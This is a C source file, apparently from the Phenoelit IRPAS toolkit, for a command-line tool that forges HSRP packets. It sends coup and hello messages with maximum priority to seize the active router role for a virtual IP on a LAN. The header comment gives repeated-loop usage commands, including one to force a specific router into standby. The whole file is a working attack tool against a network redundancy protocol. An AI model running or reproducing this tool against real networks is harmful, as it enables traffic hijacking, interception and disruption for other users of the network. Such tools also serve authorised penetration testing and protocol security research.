/* HSRP 
 * part of Phenoelit IRPAS
 *
 * $Id: hsrp.c,v 1.3 2001/07/03 20:00:10 fx Exp $
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <rpc/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>

#include <sys/ioctl.h>
#include <netinet/in.h>                
#include <netpacket/packet.h>
#include <net/ethernet.h>               
#include <net/if.h>

#include "protocols.h"
#include "packets.h"

/* use:
 *
 * 
 while (true); do (./hsrp -d 224.0.0.2 -v 192.168.1.22 -a fuckfuck -g 1 -i eth0 ; sleep 3); done
 *
 To force 192.168.1.10 into standby :
 while (true); do (./hsrp -d 192.168.1.10 -v 192.168.1.22 -a fuckfuck -g 1 -i eth0 ; sleep 3); done
 *
 */


int main(int argc, char **argv) {
    char		option;
    extern char		*optarg;
    int			sfd;
    u_char		pack[sizeof(iphdr_t)+sizeof(udphdr_t)+sizeof(hsrp_t)];
    iphdr_t		*ip;
    udphdr_t		*udp;
    hsrp_t		*hsrp;
    struct in_addr	vip,dest,src;
    char		auth[9];
    unsigned short	group;
    char		*device=NULL;


    memset(&src,0,sizeof(src));
    memset(&dest,0,sizeof(dest));
    memset(&vip,0,sizeof(vip));
    ip=(iphdr_t *)&pack;
    udp=(udphdr_t *)((void *)&pack+sizeof(iphdr_t));
    hsrp=(hsrp_t *)((void *)&pack+sizeof(iphdr_t)+sizeof(udphdr_t));
    while ((option=getopt(argc,argv,"i:d:v:a:g:S:"))!=EOF) {
	switch (option) {
	    case 'd':	if (!inet_aton(optarg,&dest)) {
			    fprintf(stderr,"%s invalid\n",optarg);
			    return 1;
			}
			break;
	    case 'v':	if (!inet_aton(optarg,&vip)) {
			    fprintf(stderr,"%s invalid\n",optarg);
			    return 1;
			}
			break;
	    case 'S':	if (!inet_aton(optarg,&src)) {
			    fprintf(stderr,"%s invalid\n",optarg);
			    return 1;
			}
			break;
	    case 'a':	memset(auth,0,sizeof(auth));
			strncpy(auth,optarg,8);
			break;
	    case 'g':	group=(unsigned short)atoi(optarg);
			break;
	    case 'i':	device=smalloc(strlen(optarg)+1);
			strcpy(device,optarg);
			break;
			return 1;
	}
    }

    if (!(device&&*((u_int32_t *)&vip)&&*((u_int32_t *)&dest))) {
	printf("%s -i <interface> -v <virtual IP> "
		"-d <router ip> -a <authword>\n\t-g <group> [-S <source>]\n"
		"EXAMPLE:\nwhile (true);\n  do (./hsrp -d 224.0.0.2 -v"
		"192.168.1.22 -a cisco -g 1 -i eth0 ; "
		"sleep 3);\ndone\n",argv[0]);
	return 1;
    }

    
    memset(pack,0,sizeof(pack));
    if ((sfd=init_socket_IP4(device,1))==(-1)) return(1);

    ip->version=4;
    ip->ihl=sizeof(iphdr_t)/4;

    ip->tot_len=htons(sizeof(pack));
    ip->ttl=0x80;
    ip->protocol=IPPROTO_UDP;

    if (*((u_int32_t *)&(src.s_addr))==0) {
	memcpy(&(ip->saddr.s_addr),&(packet_ifconfig.ip.s_addr),IP_ADDR_LEN);
    } else {
	memcpy(&(ip->saddr.s_addr),&(src.s_addr),IP_ADDR_LEN);
    }
    memcpy(&(ip->daddr.s_addr),&(dest.s_addr),IP_ADDR_LEN);

    udp->sport=udp->dport=htons(1985);
    udp->length=htons(sizeof(udphdr_t)+sizeof(hsrp_t));

    hsrp->version=0;
    hsrp->opcode=HSRP_OPCODE_COUP;
    hsrp->state=HSRP_STATE_ACTIVE;
    hsrp->hellotime=3;
    hsrp->holdtime=255;
    hsrp->prio=255;
    hsrp->group=group;
    memcpy(&(hsrp->auth),auth,8);
    memcpy(&(hsrp->virtip),&(vip.s_addr),IP_ADDR_LEN);

    sendpack_IP4(sfd,pack,sizeof(pack));
    hsrp->opcode=HSRP_OPCODE_HELLO;
    sendpack_IP4(sfd,pack,sizeof(pack));

    close(sfd);

    return 0;
}
